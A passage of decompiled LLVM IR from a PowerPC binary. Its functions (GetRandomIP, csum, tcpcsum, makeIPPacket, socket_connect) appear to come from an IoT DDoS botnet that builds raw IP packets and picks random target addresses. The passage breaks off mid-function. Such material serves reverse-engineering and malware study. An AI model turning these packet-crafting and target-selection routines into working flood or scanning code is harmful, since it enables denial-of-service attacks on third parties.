  uselistorder label %dec_label_pc_100070d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000707c, { 1, 0 }
  uselistorder label %dec_label_pc_10007028, { 1, 0 }
  uselistorder label %dec_label_pc_10006fd4, { 1, 0 }
  uselistorder label %dec_label_pc_10006f80, { 1, 0 }
  uselistorder label %dec_label_pc_10006f2c, { 1, 0 }
  uselistorder label %dec_label_pc_10006ed8, { 1, 0 }
  uselistorder label %dec_label_pc_10006e84, { 1, 0 }
  uselistorder label %dec_label_pc_10006e30, { 1, 0 }
  uselistorder label %dec_label_pc_10006ddc, { 1, 0 }
  uselistorder label %dec_label_pc_10006d88, { 1, 0 }
  uselistorder label %dec_label_pc_10006d34, { 1, 0 }
  uselistorder label %dec_label_pc_10006ce0, { 1, 0 }
  uselistorder label %dec_label_pc_10006c8c, { 1, 0 }
  uselistorder label %dec_label_pc_10006c38, { 1, 0 }
  uselistorder label %dec_label_pc_10006be4, { 1, 0 }
  uselistorder label %dec_label_pc_10006b90, { 1, 0 }
  uselistorder label %dec_label_pc_10006b3c, { 1, 0 }
  uselistorder label %dec_label_pc_10006ae8, { 1, 0 }
  uselistorder label %dec_label_pc_10006a94, { 1, 0 }
  uselistorder label %dec_label_pc_10006a40, { 1, 0 }
  uselistorder label %dec_label_pc_100069ec, { 1, 0 }
  uselistorder label %dec_label_pc_10006998, { 1, 0 }
  uselistorder label %dec_label_pc_10006944, { 1, 0 }
  uselistorder label %dec_label_pc_100068f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000689c, { 1, 0 }
  uselistorder label %dec_label_pc_10006848, { 1, 0 }
  uselistorder label %dec_label_pc_100067f4, { 1, 0 }
  uselistorder label %dec_label_pc_100067a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000674c, { 1, 0 }
  uselistorder label %dec_label_pc_100066f8, { 1, 0 }
  uselistorder label %dec_label_pc_100066a4, { 1, 0 }
  uselistorder label %dec_label_pc_10006650, { 1, 0 }
  uselistorder label %dec_label_pc_100065fc, { 1, 0 }
  uselistorder label %dec_label_pc_100065a8, { 1, 0 }
  uselistorder label %dec_label_pc_10006554, { 1, 0 }
  uselistorder label %dec_label_pc_10006500, { 1, 0 }
  uselistorder label %dec_label_pc_100064ac, { 1, 0 }
  uselistorder label %dec_label_pc_10006458, { 1, 0 }
  uselistorder label %dec_label_pc_10006404, { 1, 0 }
  uselistorder label %dec_label_pc_100063b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000635c, { 1, 0 }
  uselistorder label %dec_label_pc_10006308, { 1, 0 }
  uselistorder label %dec_label_pc_100062b4, { 1, 0 }
  uselistorder label %dec_label_pc_10006260, { 1, 0 }
  uselistorder label %dec_label_pc_1000620c, { 1, 0 }
  uselistorder label %dec_label_pc_100061b8, { 1, 0 }
  uselistorder label %dec_label_pc_10006164, { 1, 0 }
  uselistorder label %dec_label_pc_10006110, { 1, 0 }
  uselistorder label %dec_label_pc_100060bc, { 1, 0 }
  uselistorder label %dec_label_pc_10006068, { 1, 0 }
  uselistorder label %dec_label_pc_10006014, { 1, 0 }
  uselistorder label %dec_label_pc_10005fc0, { 1, 0 }
  uselistorder label %dec_label_pc_10005f6c, { 1, 0 }
  uselistorder label %dec_label_pc_10005f18, { 1, 0 }
  uselistorder label %dec_label_pc_10005ec4, { 1, 0 }
  uselistorder label %dec_label_pc_10005e70, { 1, 0 }
  uselistorder label %dec_label_pc_10005e1c, { 1, 0 }
  uselistorder label %dec_label_pc_10005dc8, { 1, 0 }
  uselistorder label %dec_label_pc_10005d74, { 1, 0 }
  uselistorder label %dec_label_pc_10005d20, { 1, 0 }
  uselistorder label %dec_label_pc_10005ccc, { 1, 0 }
  uselistorder label %dec_label_pc_10005c78, { 1, 0 }
  uselistorder label %dec_label_pc_10005c24, { 1, 0 }
  uselistorder label %dec_label_pc_10005bd0, { 1, 0 }
  uselistorder label %dec_label_pc_10005b7c, { 1, 0 }
  uselistorder label %dec_label_pc_10005b28, { 1, 0 }
  uselistorder label %dec_label_pc_10005ad4, { 1, 0 }
  uselistorder label %dec_label_pc_10005a80, { 1, 0 }
  uselistorder label %dec_label_pc_10005a2c, { 1, 0 }
  uselistorder label %dec_label_pc_100059d8, { 1, 0 }
  uselistorder label %dec_label_pc_10005984, { 1, 0 }
  uselistorder label %dec_label_pc_10005930, { 1, 0 }
  uselistorder label %dec_label_pc_100058dc, { 1, 0 }
  uselistorder label %dec_label_pc_10005888, { 1, 0 }
  uselistorder label %dec_label_pc_10005834, { 1, 0 }
  uselistorder label %dec_label_pc_100057e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000578c, { 1, 0 }
  uselistorder label %dec_label_pc_10005738, { 1, 0 }
  uselistorder label %dec_label_pc_100056e4, { 1, 0 }
  uselistorder label %dec_label_pc_10005690, { 1, 0 }
  uselistorder label %dec_label_pc_1000563c, { 1, 0 }
  uselistorder label %dec_label_pc_100055e8, { 1, 0 }
  uselistorder label %dec_label_pc_10005594, { 1, 0 }
  uselistorder label %dec_label_pc_10005540, { 1, 0 }
  uselistorder label %dec_label_pc_100054ec, { 1, 0 }
  uselistorder label %dec_label_pc_10005498, { 1, 0 }
  uselistorder label %dec_label_pc_10005444, { 1, 0 }
  uselistorder label %dec_label_pc_100053f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000539c, { 1, 0 }
  uselistorder label %dec_label_pc_10005348, { 1, 0 }
  uselistorder label %dec_label_pc_100052f4, { 1, 0 }
  uselistorder label %dec_label_pc_100052a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000524c, { 1, 0 }
  uselistorder label %dec_label_pc_100051f8, { 1, 0 }
  uselistorder label %dec_label_pc_100051a4, { 1, 0 }
  uselistorder label %dec_label_pc_10005150, { 1, 0 }
  uselistorder label %dec_label_pc_100050fc, { 1, 0 }
  uselistorder label %dec_label_pc_100050a8, { 1, 0 }
  uselistorder label %dec_label_pc_10005054, { 1, 0 }
  uselistorder label %dec_label_pc_10005000, { 1, 0 }
  uselistorder label %dec_label_pc_10004fac, { 1, 0 }
  uselistorder label %dec_label_pc_10004f58, { 1, 0 }
  uselistorder label %dec_label_pc_10004f04, { 1, 0 }
  uselistorder label %dec_label_pc_10004eb0, { 1, 0 }
  uselistorder label %dec_label_pc_10004e5c, { 1, 0 }
  uselistorder label %dec_label_pc_10004e08, { 1, 0 }
  uselistorder label %dec_label_pc_10004db4, { 1, 0 }
  uselistorder label %dec_label_pc_10004d60, { 1, 0 }
  uselistorder label %dec_label_pc_10004d0c, { 1, 0 }
  uselistorder label %dec_label_pc_10004cb8, { 1, 0 }
  uselistorder label %dec_label_pc_10004c64, { 1, 0 }
  uselistorder label %dec_label_pc_10004c10, { 1, 0 }
  uselistorder label %dec_label_pc_10004bbc, { 1, 0 }
  uselistorder label %dec_label_pc_10004b68, { 1, 0 }
  uselistorder label %dec_label_pc_10004b14, { 1, 0 }
  uselistorder label %dec_label_pc_10004ac0, { 1, 0 }
  uselistorder label %dec_label_pc_10004a6c, { 1, 0 }
  uselistorder label %dec_label_pc_10004a18, { 1, 0 }
  uselistorder label %dec_label_pc_100049c4, { 1, 0 }
  uselistorder label %dec_label_pc_10004970, { 1, 0 }
  uselistorder label %dec_label_pc_1000491c, { 1, 0 }
  uselistorder label %dec_label_pc_100048c8, { 1, 0 }
  uselistorder label %dec_label_pc_10004874, { 1, 0 }
  uselistorder label %dec_label_pc_10004820, { 1, 0 }
  uselistorder label %dec_label_pc_100047cc, { 1, 0 }
  uselistorder label %dec_label_pc_10004778, { 1, 0 }
  uselistorder label %dec_label_pc_10004724, { 1, 0 }
  uselistorder label %dec_label_pc_100046d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000467c, { 1, 0 }
  uselistorder label %dec_label_pc_10004628, { 1, 0 }
  uselistorder label %dec_label_pc_100045d4, { 1, 0 }
  uselistorder label %dec_label_pc_10004580, { 1, 0 }
  uselistorder label %dec_label_pc_1000452c, { 1, 0 }
  uselistorder label %dec_label_pc_100044d8, { 1, 0 }
  uselistorder label %dec_label_pc_10004484, { 1, 0 }
  uselistorder label %dec_label_pc_10004430, { 1, 0 }
  uselistorder label %dec_label_pc_100043dc, { 1, 0 }
  uselistorder label %dec_label_pc_10004388, { 1, 0 }
  uselistorder label %dec_label_pc_10004334, { 1, 0 }
  uselistorder label %dec_label_pc_100042e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000428c, { 1, 0 }
  uselistorder label %dec_label_pc_10004238, { 1, 0 }
  uselistorder label %dec_label_pc_100041e4, { 1, 0 }
  uselistorder label %dec_label_pc_10004190, { 1, 0 }
  uselistorder label %dec_label_pc_1000413c, { 1, 0 }
  uselistorder label %dec_label_pc_100040e8, { 1, 0 }
  uselistorder label %dec_label_pc_10004094, { 1, 0 }
  uselistorder label %dec_label_pc_10004040, { 1, 0 }
  uselistorder label %dec_label_pc_10003fec, { 1, 0 }
  uselistorder label %dec_label_pc_10003f98, { 1, 0 }
  uselistorder label %dec_label_pc_10003f44, { 1, 0 }
  uselistorder label %dec_label_pc_10003ef0, { 1, 0 }
  uselistorder label %dec_label_pc_10003e9c, { 1, 0 }
  uselistorder label %dec_label_pc_10003e48, { 1, 0 }
  uselistorder label %dec_label_pc_10003df4, { 1, 0 }
  uselistorder label %dec_label_pc_10003da0, { 1, 0 }
  uselistorder label %dec_label_pc_10003d4c, { 1, 0 }
  uselistorder label %dec_label_pc_10003cf8, { 1, 0 }
  uselistorder label %dec_label_pc_10003ca4, { 1, 0 }
  uselistorder label %dec_label_pc_10003c50, { 1, 0 }
  uselistorder label %dec_label_pc_10003bfc, { 1, 0 }
  uselistorder label %dec_label_pc_10003ba8, { 1, 0 }
  uselistorder label %dec_label_pc_10003b54, { 1, 0 }
  uselistorder label %dec_label_pc_10003b00, { 1, 0 }
  uselistorder label %dec_label_pc_10003aac, { 1, 0 }
  uselistorder label %dec_label_pc_10003a58, { 1, 0 }
  uselistorder label %dec_label_pc_10003a04, { 1, 0 }
  uselistorder label %dec_label_pc_100039b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000395c, { 1, 0 }
  uselistorder label %dec_label_pc_10003908, { 1, 0 }
  uselistorder label %dec_label_pc_100038b4, { 1, 0 }
  uselistorder label %dec_label_pc_10003860, { 1, 0 }
  uselistorder label %dec_label_pc_1000380c, { 1, 0 }
  uselistorder label %dec_label_pc_100037b8, { 1, 0 }
  uselistorder label %dec_label_pc_10003764, { 1, 0 }
  uselistorder label %dec_label_pc_10003710, { 1, 0 }
  uselistorder label %dec_label_pc_100036bc, { 1, 0 }
  uselistorder label %dec_label_pc_10003668, { 1, 0 }
  uselistorder label %dec_label_pc_10003614, { 1, 0 }
  uselistorder label %dec_label_pc_100035c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000356c, { 1, 0 }
  uselistorder label %dec_label_pc_10003518, { 1, 0 }
  uselistorder label %dec_label_pc_100034c4, { 1, 0 }
  uselistorder label %dec_label_pc_10003470, { 1, 0 }
  uselistorder label %dec_label_pc_1000341c, { 1, 0 }
  uselistorder label %dec_label_pc_100033c8, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10007850 = load i32, i32* @global_var_100285d8.249, align 4
  store i32 %v3_10007850, i32* @r3, align 4
  %v2_10007858 = call i32 @ntohl(i32 %v3_10007850, i32 268632064)
  %v2_10007864 = and i32 %v2_10007858, %arg1
  %v0_1000786c = call i32 @rand_cmwc()
  %v1_10007878 = sub i32 -1, %arg1
  %v2_1000787c = and i32 %v0_1000786c, %v1_10007878
  %v2_10007884 = xor i32 %v2_1000787c, %v2_10007864
  ret i32 %v2_10007884
}

define i32 @csum(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp20 = call i16 @__decompiler_undefined_function_4()
  %v2_100079142 = icmp sgt i32 %arg2, 1
  br i1 %v2_100079142, label %dec_label_pc_100078cc, label %dec_label_pc_1000791c

dec_label_pc_100078cc:                            ; preds = %entry, %dec_label_pc_100078cc
  %stack_var_-24.07 = phi i16* [ %v5_10007900, %dec_label_pc_100078cc ], [ %arg1, %entry ]
  %stack_var_-20.06 = phi i32 [ %v1_10007908, %dec_label_pc_100078cc ], [ %arg2, %entry ]
  %stack_var_-16.05 = phi i32 [ %v5_100078ec, %dec_label_pc_100078cc ], [ 0, %entry ]
  %stack_var_-12.04 = phi i32 [ %v2_100078e8, %dec_label_pc_100078cc ], [ 0, %entry ]
  %v4_100078cc = ptrtoint i16* %stack_var_-24.07 to i32
  %v2_100078d0 = load i16, i16* %stack_var_-24.07, align 2
  %v3_100078d0 = zext i16 %v2_100078d0 to i32
  %v2_100078e8 = add i32 %v3_100078d0, %stack_var_-12.04
  %v3_100078e8 = icmp ult i32 %v2_100078e8, %stack_var_-12.04
  %v4_100078ec = zext i1 %v3_100078e8 to i32
  %v5_100078ec = add i32 %v4_100078ec, %stack_var_-16.05
  %v1_100078fc = add i32 %v4_100078cc, 2
  %v5_10007900 = inttoptr i32 %v1_100078fc to i16*
  %v1_10007908 = add nsw i32 %stack_var_-20.06, -2
  %v2_10007914 = icmp sgt i32 %v1_10007908, 1
  br i1 %v2_10007914, label %dec_label_pc_100078cc, label %dec_label_pc_10007910.dec_label_pc_1000791c_crit_edge

dec_label_pc_10007910.dec_label_pc_1000791c_crit_edge: ; preds = %dec_label_pc_100078cc
  %v3_10007914.le = icmp eq i32 %v1_10007908, 1
  br i1 %v3_10007914.le, label %dec_label_pc_10007928, label %dec_label_pc_10007994.preheader

dec_label_pc_1000791c:                            ; preds = %entry
  %v3_100079143 = icmp eq i32 %arg2, 1
  br i1 %v3_100079143, label %dec_label_pc_10007928, label %dec_label_pc_10007994.preheader

dec_label_pc_10007928:                            ; preds = %dec_label_pc_10007910.dec_label_pc_1000791c_crit_edge, %dec_label_pc_1000791c
  %stack_var_-24.0.lcssa19 = phi i16* [ %v5_10007900, %dec_label_pc_10007910.dec_label_pc_1000791c_crit_edge ], [ %arg1, %dec_label_pc_1000791c ]
  %stack_var_-16.0.lcssa18 = phi i32 [ %v5_100078ec, %dec_label_pc_10007910.dec_label_pc_1000791c_crit_edge ], [ 0, %dec_label_pc_1000791c ]
  %stack_var_-12.0.lcssa17 = phi i32 [ %v2_100078e8, %dec_label_pc_10007910.dec_label_pc_1000791c_crit_edge ], [ 0, %dec_label_pc_1000791c ]
  %v1_1000792c = bitcast i16* %stack_var_-24.0.lcssa19 to i8*
  %v2_1000792c = load i8, i8* %v1_1000792c, align 1
  %v3_1000792c = zext i8 %v2_1000792c to i32
  %v2_10007944 = add i32 %v3_1000792c, %stack_var_-12.0.lcssa17
  %v3_10007944 = icmp ult i32 %v2_10007944, %stack_var_-12.0.lcssa17
  %v4_10007948 = zext i1 %v3_10007944 to i32
  %v5_10007948 = add i32 %v4_10007948, %stack_var_-16.0.lcssa18
  br label %dec_label_pc_10007994.preheader

dec_label_pc_10007994.preheader:                  ; preds = %dec_label_pc_10007910.dec_label_pc_1000791c_crit_edge, %dec_label_pc_10007928, %dec_label_pc_1000791c
  %stack_var_-12.1.ph = phi i32 [ %v2_100078e8, %dec_label_pc_10007910.dec_label_pc_1000791c_crit_edge ], [ 0, %dec_label_pc_1000791c ], [ %v2_10007944, %dec_label_pc_10007928 ]
  %stack_var_-16.1.ph = phi i32 [ %v5_100078ec, %dec_label_pc_10007910.dec_label_pc_1000791c_crit_edge ], [ 0, %dec_label_pc_1000791c ], [ %v5_10007948, %dec_label_pc_10007928 ]
  %v1_1000799828 = mul i32 %stack_var_-16.1.ph, 65536
  %v1_100079a029 = udiv i32 %stack_var_-12.1.ph, 65536
  %v2_100079a430 = or i32 %v1_1000799828, %v1_100079a029
  %v1_100079ac31 = udiv i32 %stack_var_-16.1.ph, 65536
  %v2_100079b432 = or i32 %v2_100079a430, %v1_100079ac31
  %v3_100079b833 = icmp eq i32 %v2_100079b432, 0
  br i1 %v3_100079b833, label %dec_label_pc_100079c0, label %dec_label_pc_10007958

dec_label_pc_10007958:                            ; preds = %dec_label_pc_10007994.preheader, %dec_label_pc_10007958
  %v1_100079ac36 = phi i32 [ %v1_100079ac, %dec_label_pc_10007958 ], [ %v1_100079ac31, %dec_label_pc_10007994.preheader ]
  %v2_100079a435 = phi i32 [ %v2_100079a4, %dec_label_pc_10007958 ], [ %v2_100079a430, %dec_label_pc_10007994.preheader ]
  %stack_var_-12.134 = phi i32 [ %v2_10007984, %dec_label_pc_10007958 ], [ %stack_var_-12.1.ph, %dec_label_pc_10007994.preheader ]
  %v1_10007964 = urem i32 %stack_var_-12.134, 65536
  %v2_10007984 = add i32 %v2_100079a435, %v1_10007964
  %v3_10007984 = icmp ult i32 %v2_10007984, %v1_10007964
  %v4_10007988 = zext i1 %v3_10007984 to i32
  %v5_10007988 = add nuw nsw i32 %v4_10007988, %v1_100079ac36
  %v1_10007998 = mul i32 %v5_10007988, 65536
  %v1_100079a0 = udiv i32 %v2_10007984, 65536
  %v2_100079a4 = or i32 %v1_10007998, %v1_100079a0
  %v1_100079ac = udiv i32 %v5_10007988, 65536
  %v2_100079b4 = or i32 %v2_100079a4, %v1_100079ac
  %v3_100079b8 = icmp eq i32 %v2_100079b4, 0
  br i1 %v3_100079b8, label %dec_label_pc_10007994.dec_label_pc_100079c0_crit_edge, label %dec_label_pc_10007958

dec_label_pc_10007994.dec_label_pc_100079c0_crit_edge: ; preds = %dec_label_pc_10007958
  br label %dec_label_pc_100079c0

dec_label_pc_100079c0:                            ; preds = %dec_label_pc_10007994.dec_label_pc_100079c0_crit_edge, %dec_label_pc_10007994.preheader
  %v4_100079c0 = zext i16 %tmp20 to i32
  %v1_100079cc = xor i32 %v4_100079c0, 65535
  ret i32 %v1_100079cc

; uselistorder directives
  uselistorder i32 %v2_100079a4, { 1, 0 }
  uselistorder i32 %v5_10007988, { 1, 0 }
  uselistorder i32 %v2_10007984, { 0, 2, 1 }
  uselistorder i32 %v1_100079ac31, { 1, 0 }
  uselistorder i32 %stack_var_-16.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa17, { 1, 0 }
  uselistorder i32 %v1_10007908, { 0, 2, 1 }
  uselistorder i32 %v2_100078e8, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-12.04, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10007958, { 1, 0 }
  uselistorder label %dec_label_pc_10007994.preheader, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10007928, { 1, 0 }
  uselistorder label %dec_label_pc_100078cc, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-64 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100079e4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100079e4, i32* %stack_var_-64, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_10007a10 = add i32 %arg1, 12
  %v2_10007a10 = inttoptr i32 %v1_10007a10 to i32*
  %v3_10007a10 = load i32, i32* %v2_10007a10, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_10007a1c = add i32 %arg1, 16
  %v2_10007a1c = inttoptr i32 %v1_10007a1c to i32*
  %v3_10007a1c = load i32, i32* %v2_10007a1c, align 4
  store i32 20, i32* @r3, align 4
  %v1_10007a38 = call i32 @htons(i32 20)
  store i32 32, i32* @r3, align 4
  store i32 268466776, i32* @lr, align 4
  %v0_10007a54 = call i32 @malloc()
  store i32 %v0_10007a54, i32* %r11.global-to-local, align 4
  store i32 %v3_10007a1c, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10007a74 = inttoptr i32 %v0_10007a54 to i32*
  store i32 %v3_10007a10, i32* %v2_10007a74, align 4
  %v0_10007a78 = load i32, i32* %r10.global-to-local, align 4
  %v1_10007a78 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007a78 = add i32 %v1_10007a78, 4
  %v3_10007a78 = inttoptr i32 %v2_10007a78 to i32*
  store i32 %v0_10007a78, i32* %v3_10007a78, align 4
  %v0_10007a7c = load i32, i32* %r9.global-to-local, align 4
  %v1_10007a7c = load i32, i32* %r11.global-to-local, align 4
  %v2_10007a7c = add i32 %v1_10007a7c, 8
  %v3_10007a7c = inttoptr i32 %v2_10007a7c to i32*
  store i32 %v0_10007a7c, i32* %v3_10007a7c, align 4
  %v1_10007a84 = add i32 %v0_10007a54, 12
  store i32 %v1_10007a84, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_10007a8c = load i32, i32* %arg2, align 4
  %v1_10007a90 = add i32 %tmp, 4
  %v2_10007a90 = inttoptr i32 %v1_10007a90 to i32*
  %v3_10007a90 = load i32, i32* %v2_10007a90, align 4
  store i32 %v3_10007a90, i32* %r10.global-to-local, align 4
  %v1_10007a94 = add i32 %tmp, 8
  %v2_10007a94 = inttoptr i32 %v1_10007a94 to i32*
  %v3_10007a94 = load i32, i32* %v2_10007a94, align 4
  %v1_10007a98 = add i32 %tmp, 12
  %v2_10007a98 = inttoptr i32 %v1_10007a98 to i32*
  %v3_10007a98 = load i32, i32* %v2_10007a98, align 4
  %v2_10007a9c = inttoptr i32 %v1_10007a84 to i32*
  store i32 %v2_10007a8c, i32* %v2_10007a9c, align 4
  %v0_10007aa0 = load i32, i32* %r10.global-to-local, align 4
  %v1_10007aa0 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007aa0 = add i32 %v1_10007aa0, 4
  %v3_10007aa0 = inttoptr i32 %v2_10007aa0 to i32*
  store i32 %v0_10007aa0, i32* %v3_10007aa0, align 4
  %v1_10007aa4 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007aa4 = add i32 %v1_10007aa4, 8
  %v3_10007aa4 = inttoptr i32 %v2_10007aa4 to i32*
  store i32 %v3_10007a94, i32* %v3_10007aa4, align 4
  %v1_10007aa8 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007aa8 = add i32 %v1_10007aa8, 12
  %v3_10007aa8 = inttoptr i32 %v2_10007aa8 to i32*
  store i32 %v3_10007a98, i32* %v3_10007aa8, align 4
  %v1_10007aac = add i32 %tmp, 16
  %v2_10007aac = inttoptr i32 %v1_10007aac to i32*
  %v3_10007aac = load i32, i32* %v2_10007aac, align 4
  %v1_10007ab0 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007ab0 = add i32 %v1_10007ab0, 16
  %v3_10007ab0 = inttoptr i32 %v2_10007ab0 to i32*
  store i32 %v3_10007aac, i32* %v3_10007ab0, align 4
  %v5_10007abc = inttoptr i32 %v0_10007a54 to i16*
  %v6_10007abc = call i32 @csum(i16* %v5_10007abc, i32 32, i32 %v3_10007a98, i32 %v3_10007a94, i32 %tmp)
  %sext = mul i32 %v6_10007abc, 65536
  %v1_10007ac0 = sdiv i32 %sext, 65536
  store i32 %v0_10007a54, i32* @r3, align 4
  store i32 268466896, i32* @lr, align 4
  %v0_10007acc = call i32 @free()
  %v1_10007ad4 = urem i32 %v1_10007ac0, 65536
  %v2_10007adc = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_10007adc, i32* %r11.global-to-local, align 4
  ret i32 %v1_10007ad4

; uselistorder directives
  uselistorder i32 %v0_10007a54, { 3, 2, 1, 0, 4 }
  uselistorder i32 %tmp, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8 }
}

define i32 @makeIPPacket(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v1_10007b2c = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10007b2c, i32* %arg1, align 4
  %v1_10007b40 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10007b40, i32* %arg1, align 4
  %v3_10007b50 = add i32 %tmp1, 1
  %v4_10007b50 = inttoptr i32 %v3_10007b50 to i8*
  store i8 0, i8* %v4_10007b50, align 1
  %fold = add i32 %arg5, 20
  %v1_10007b68 = trunc i32 %fold to i16
  %v3_10007b68 = add i32 %tmp1, 2
  %v4_10007b68 = inttoptr i32 %v3_10007b68 to i16*
  store i16 %v1_10007b68, i16* %v4_10007b68, align 2
  %v0_10007b6c = call i32 @rand_cmwc()
  %v1_10007b7c = trunc i32 %v0_10007b6c to i16
  %v3_10007b7c = add i32 %tmp1, 4
  %v4_10007b7c = inttoptr i32 %v3_10007b7c to i16*
  store i16 %v1_10007b7c, i16* %v4_10007b7c, align 2
  %v3_10007b88 = add i32 %tmp1, 6
  %v4_10007b88 = inttoptr i32 %v3_10007b88 to i16*
  store i16 0, i16* %v4_10007b88, align 2
  %v3_10007b94 = add i32 %tmp1, 8
  %v4_10007b94 = inttoptr i32 %v3_10007b94 to i8*
  store i8 -1, i8* %v4_10007b94, align 1
  %v3_10007ba0 = add i32 %tmp1, 9
  %v4_10007ba0 = inttoptr i32 %v3_10007ba0 to i8*
  store i8 %tmp, i8* %v4_10007ba0, align 1
  %v3_10007bac = add i32 %tmp1, 10
  %v4_10007bac = inttoptr i32 %v3_10007bac to i16*
  store i16 0, i16* %v4_10007bac, align 2
  %v2_10007bb8 = add i32 %tmp1, 12
  %v3_10007bb8 = inttoptr i32 %v2_10007bb8 to i32*
  store i32 %arg3, i32* %v3_10007bb8, align 4
  %v2_10007bc4 = add i32 %tmp1, 16
  %v3_10007bc4 = inttoptr i32 %v2_10007bc4 to i32*
  store i32 %arg2, i32* %v3_10007bc4, align 4
  ret i32 %v0_10007b6c
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v2_10007bfc = icmp sgt i32 %arg1, 2
  br i1 %v2_10007bfc, label %dec_label_pc_10007c10, label %dec_label_pc_10007c20

dec_label_pc_10007c10:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10007c18.250 to i32), i32* @lr, align 4
  %v1_10007c14 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_10007c20

dec_label_pc_10007c20:                            ; preds = %entry, %dec_label_pc_10007c10
  %storemerge = phi i32 [ 0, %dec_label_pc_10007c10 ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_10007c20, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  store i32 268467312, i32* @lr, align 4
  %v1_10007c6c = call i32 @__GI_gethostbyname(i32 %arg1)
  %v3_10007c7c = icmp eq i32 %v1_10007c6c, 0
  br i1 %v3_10007c7c, label %dec_label_pc_10007c84, label %dec_label_pc_10007c90

dec_label_pc_10007c84:                            ; preds = %entry
  br label %dec_label_pc_10007d68

dec_label_pc_10007c90:                            ; preds = %entry
  %v1_10007c94 = add i32 %v1_10007c6c, 16
  %v2_10007c94 = inttoptr i32 %v1_10007c94 to i32*
  %v3_10007c94 = load i32, i32* %v2_10007c94, align 4
  %v1_10007c98 = inttoptr i32 %v3_10007c94 to i32*
  %v2_10007c98 = load i32, i32* %v1_10007c98, align 4
  %v1_10007ca0 = add i32 %v1_10007c6c, 12
  %v2_10007ca0 = inttoptr i32 %v1_10007ca0 to i32*
  %v3_10007ca0 = load i32, i32* %v2_10007ca0, align 4
  %v2_10007ca8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_10007cac = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v3_10007ca0, i32* @r5, align 4
  store i32 268467392, i32* @lr, align 4
  %v4_10007cbc = call i32 @bcopy(i32 %v2_10007c98, i32 %v2_10007cac, i32 %v3_10007ca0, i32 %v2_10007ca8)
  %v4_10007cc0 = zext i16 %arg2 to i32
  store i32 %v4_10007cc0, i32* @r3, align 4
  %v1_10007ccc = call i32 @htons(i32 %v4_10007cc0)
  store i32 2, i32* %stack_var_-48, align 4
  store i32 268467440, i32* @lr, align 4
  %v3_10007cec = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_10007cf8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 268467476, i32* @lr, align 4
  %v5_10007d10 = call i32 @__GI_setsockopt(i32 %v3_10007cec, i32 6, i32 1, i32 %v2_10007cf8, i32 4)
  %v4_10007d1c = icmp eq i32 %v3_10007cec, -1
  br i1 %v4_10007d1c, label %dec_label_pc_10007d24, label %dec_label_pc_10007d30

dec_label_pc_10007d24:                            ; preds = %dec_label_pc_10007c90
  br label %dec_label_pc_10007d68

dec_label_pc_10007d30:                            ; preds = %dec_label_pc_10007c90
  store i32 268467524, i32* @lr, align 4
  %v3_10007d40 = call i32 @__libc_connect(i32 %v3_10007cec, i32 %v2_10007ca8, i32 16)
  %v4_10007d4c = icmp eq i32 %v3_10007d40, -1
  br i1 %v4_10007d4c, label %dec_label_pc_10007d54, label %dec_label_pc_10007d60

dec_label_pc_10007d54:                            ; preds = %dec_label_pc_10007d30
  br label %dec_label_pc_10007d68

dec_label_pc_10007d60:                            ; preds = %dec_label_pc_10007d30
  br label %dec_label_pc_10007d68

